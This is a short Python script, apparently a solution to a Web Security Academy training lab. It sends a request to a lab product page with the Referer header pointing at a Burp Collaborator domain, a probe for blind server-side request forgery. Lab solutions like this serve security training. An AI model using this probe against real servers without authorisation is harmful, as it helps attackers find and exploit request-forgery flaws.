import requests

s = requests.Session()
url = 'https://ac031f071fcabd45c07e17bc00330037.web-security-academy.net/product?productId=2'
s.get(url, headers={'referer' : "https://burpcollaborator.net"})
